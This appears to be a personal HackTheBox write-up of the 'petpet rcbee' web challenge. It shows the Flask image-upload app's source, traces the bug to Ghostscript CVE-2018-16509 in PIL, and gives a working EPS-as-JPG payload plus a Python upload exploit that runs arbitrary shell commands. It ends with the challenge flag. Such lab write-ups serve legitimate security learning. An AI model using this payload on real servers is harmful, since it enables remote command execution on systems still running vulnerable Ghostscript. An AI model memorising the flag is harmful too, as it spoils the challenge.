---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [GhostButt, Ghostscript, RCE, insecure-file-upload, python-PIL]
---
>[!quote]
>*Bees are comfy 🍯
>bees are great 🌟🌟🌟
>this is a petpet generator 👋
>let's join forces and save the bees today! 🐝*

# Set up

- **build-socker.sh**
    
    ```bash
    #!/bin/bash
    docker rm -f web_petpet_rcbee
    docker build -t web_petpet_rcbee . && \
    docker run --name=web_petpet_rcbee --rm -p1337:1337 -it web_petpet_rcbee
    ```
    
- **Dockerfile**
    
    ```bash
    FROM python:3
    
    # Install system dependencies
    RUN apt update -y; apt install -y curl supervisor 
    
    # Install Python dependencies
    RUN pip install flask Pillow
    
    # Switch working environment
    WORKDIR /tmp
    
    # Install Pillow component
    RUN curl -L -O https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23-linux-x86_64.tgz \
        && tar -xzf ghostscript-9.23-linux-x86_64.tgz \
        && mv ghostscript-9.23-linux-x86_64/gs-923-linux-x86_64 /usr/local/bin/gs && rm -rf /tmp/ghost*
    
    # Setup app
    RUN mkdir -p /app
    WORKDIR /app
    
    # Add application
    COPY challenge .
    
    # Setup supervisor
    COPY config/supervisord.conf /etc/supervisord.conf
    
    # Expose port the server is reachable on
    EXPOSE 1337
    
    # Disable pycache
    ENV PYTHONDONTWRITEBYTECODE=1
    
    # Run supervisord
    ENTRYPOINT [ "/usr/bin/supervisord", "-c", "/etc/supervisord.conf" ]
    ```
    

Started the docker container:

```bash
┌──(kali㉿kali)-[~/…/HTB/Challenge/Web/web_petpet_rcbee]                                                           
└─$ ./build-docker.sh                                                                                              
Error: No such container: web_petpet_rcbee                                                                         
Sending build context to Docker daemon  2.983MB                                                                    
Step 1/12 : FROM python:3
...
Successfully built 577fa42e5347
Successfully tagged web_petpet_rcbee:latest
2022-05-06 21:00:23,257 INFO Set uid to user 0 succeeded
2022-05-06 21:00:23,259 INFO supervisord started with pid 1
2022-05-06 21:00:24,264 INFO spawned: 'flask' with pid 7
 * Serving Flask app 'application.main' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses (0.0.0.0)
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://127.0.0.1:1337
 * Running on http://172.17.0.2:1337 (Press CTRL+C to quit)
2022-05-06 21:00:25,558 INFO success: flask entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
```

![Untitled](../../zzz_res/attachments/petpet%20rcbee%209c2feddeb3ad44648a07bea19dc44073.png)

# Information Gathering

- **run.py**
    
    ```python
    from application.main import app
    
    app.run(host='0.0.0.0', port=1337)
    ```
    
- **main.py**
    
    ```python
    from flask import Flask
    from application.blueprints.routes import web, api
    
    app = Flask(__name__)
    app.config.from_object('application.config.Config')
    
    app.register_blueprint(web, url_prefix='/')
    app.register_blueprint(api, url_prefix='/api')
    
    @app.errorhandler(404)
    def not_found(error):
        return {'error': 'Not Found'}, 404
    ```
    
- **config.py**
    
    ```python
    from application.util import generate
    
    class Config(object):
        SECRET_KEY = generate(50)
        UPLOAD_FOLDER = '/app/application/static/petpets'
        MAX_CONTENT_LENGTH = 2.5 * 1000 * 1000
    
    class ProductionConfig(Config):
        pass
    
    class DevelopmentConfig(Config):
        DEBUG = True
    
    class TestingConfig(Config):
        TESTING = True
    ```
    
- **routes.py**
    
    ```python
    from flask import Blueprint, request, render_template
    from application.util import petpet
    
    web = Blueprint('web', __name__)
    api = Blueprint('api', __name__)
    
    @web.route('/')
    def index():
        return render_template('index.html')
    
    @api.route('/upload', methods=['POST'])
    def upload():
        if 'file' not in request.files:
            return {'status': 'failed', 'message': 'No file provided'}, 400
    
        file = request.files['file']
    
        if not file or not file.filename:
            return {'status': 'failed', 'message': 'Something went wrong with the file'}, 400
    
        return petpet(file)
    ```
    
- **util.py**
    
    ```python
    import tempfile, glob, os
    from werkzeug.utils import secure_filename
    from application import main
    from PIL import Image
    
    ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])
    
    generate = lambda x: os.urandom(x).hex()
    
    def allowed_file(filename):
        return '.' in filename and \
            filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    
    def petmotion(bee, frames):
        outputFrames = []
    
        for frame in frames:
            newFrame, i = Image.new('RGBA', frame.size), frames.index(frame)
            width   = int(75*(0.8 + i * 0.02))
            height  = int(75*(0.8 + i * 0.05))
            kaloBee = bee.resize((width, height))
            frame   = frame.convert('RGBA')
            newFrame.paste(kaloBee, mask=kaloBee, box=(30, 37))
            newFrame.paste(frame, mask=frame)
            outputFrames.append(newFrame)
        
        return outputFrames
    
    def save_tmp(file):
        tmp  = tempfile.gettempdir()
        path = os.path.join(tmp, secure_filename(file.filename))
        file.save(path)
        return path
    
    def petpet(file):
    
        if not allowed_file(file.filename):
            return {'status': 'failed', 'message': 'Improper filename'}, 400
    
        try:
            
            tmp_path = save_tmp(file)
    
            bee = Image.open(tmp_path).convert('RGBA')
            frames = [Image.open(f) for f in sorted(glob.glob('application/static/img/*'))]
            finalpet = petmotion(bee, frames)
    
            filename = f'{generate(14)}.gif'
            finalpet[0].save(
                f'{main.app.config["UPLOAD_FOLDER"]}/{filename}', 
                save_all=True, 
                duration=30, 
                loop=0, 
                append_images=finalpet[1:], 
            )
    
            os.unlink(tmp_path)
    
            return {'status': 'success', 'image': f'static/petpets/{filename}'}, 200
    
        except:
            return {'status': 'failed', 'message': 'Something went wrong'}, 500
    ```
    

# The Bug

*Python PIL Module* (Python Imaging Library) is vulnerable to Remote Command Execution via Ghostscript (CVE-2018-16509)

- [https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509)
- [More Ghostscript Issues: Should we disable PS coders in policy.xml by default?](https://seclists.org/oss-sec/2018/q3/142)

# Exploitation

[PIL-RCE-Ghostscript-CVE-2018-16509/rce.jpg at master · farisv/PIL-RCE-Ghostscript-CVE-2018-16509](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509/blob/master/rce.jpg)

**exploit.jpg**

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cp /app/flag* /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

```python
#!/usr/bin/python3
from sys import argv
import requests

if len(argv) < 4:
    print('Usage: python3 exploit.py <target> <port> <payload>')
    exit()

target, port, payload = argv[1:]

print("Preparing the exploit...")

exploit = """%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%"""
exploit += payload
exploit += ") currentdevice putdeviceprops"
exploit += ''

files = {'file': ("image.jpg", exploit, 'image/jpg')}

url = f'http://{target}:{port}/api/upload'
print(f"Uploading file to {url}")

resp = requests.post(url, files=files, proxies={"http":"http://127.0.0.1:8080"})

print(resp.content)
```

Once uploaded the payload is executed and the flag copied inside the specified path:

```bash
┌──(kali㉿kali)-[~/…/HTB/Challenge/Web/web_petpet_rcbee]
└─$ python3 exploit.py 157.245.46.136 31916 'cp /app/flag* /app/application/static/petpets/flag.txt'
Preparing the exploit...
Uploading file to http://157.245.46.136:31916/api/upload
b'{"image":"static/petpets/3ffba1ff77afa897ed95983b2197.gif","status":"success"}\n'

┌──(kali㉿kali)-[~/…/HTB/Challenge/Web/web_petpet_rcbee]
└─$ curl http://157.245.46.136:31916/static/petpets/flag.txt
HTB{c0mfy_bzzzzz_rcb33s_v1b3s}
```

# Flag

>[!success]
>`HTB{c0mfy_bzzzzz_rcb33s_v1b3s}`